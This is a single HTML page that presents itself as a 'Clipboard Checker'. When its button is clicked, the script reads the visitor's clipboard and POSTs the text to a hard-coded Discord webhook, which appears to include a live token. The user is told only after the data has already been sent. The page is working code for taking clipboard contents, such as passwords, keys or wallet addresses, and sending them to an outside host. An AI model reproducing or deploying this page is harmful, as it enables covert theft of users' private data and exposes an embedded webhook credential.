<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Clipboard Checker</title><style>body{font-family:Arial,sans-serif;margin:40px;background-color:#f4f4f4}.container{max-width:500px;margin:0 auto;background-color:#fff;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);text-align:center}button{padding:10px 20px;background-color:#007BFF;color:#fff;border:none;cursor:pointer;font-size:16px;margin-top:20px}button:hover{background-color:#0056b3}p{margin-top:20px;font-size:16px}</style></head><body><div class="container"><h1>Clipboard Checker</h1><button id="checkClipboardBtn">Check Clipboard</button><p id="status"></p></div><script>document.getElementById('checkClipboardBtn').addEventListener('click', async () => {try {if (!navigator.clipboard) {document.getElementById('status').innerText = 'Clipboard API is not supported by your browser.';return}const clipboardText = await navigator.clipboard.readText();console.log('Clipboard content:', clipboardText);await sendToWebhook(clipboardText);document.getElementById('status').innerText = 'Clipboard content sent to Discord webhook.'} catch (error) {console.error('Error:', error);document.getElementById('status').innerText = 'Failed to read clipboard or send data.'}});async function sendToWebhook(content) {const webhookUrl = 'https://discord.com/api/webhooks/1271744593783820321/_-p4h4W94QKovzmdjlwnRi37fdFnE9o5lcg0DneperYQWCPI8YFAIfRFZDkm4ZGDh3i9';const payload = {content: `Clipboard Content: ${content}`};await fetch(webhookUrl, {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify(payload)})}</script></body></html>
